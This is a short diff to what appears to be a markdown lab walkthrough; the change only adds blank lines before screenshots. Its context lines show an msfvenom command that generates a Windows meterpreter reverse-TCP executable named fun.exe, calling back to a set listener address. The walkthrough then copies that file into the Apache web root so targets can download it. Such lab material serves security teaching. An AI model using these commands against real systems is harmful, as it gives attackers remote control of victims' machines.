@@ -45,6 +45,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 
 
 copy the fun.exe into the apache /var/www/html folder
+
 ![image](https://github.com/user-attachments/assets/ff975434-41a9-4fe6-ae0c-2f71156fbeb8)
 
 
@@ -63,6 +64,7 @@ sudo systemctl apache2 start
 
 
 Check the status of apache2
+
 ![Screenshot 2025-04-20 222806](https://github.com/user-attachments/assets/87a62d57-8b80-4337-85d8-76eab8de74cc)
 
 
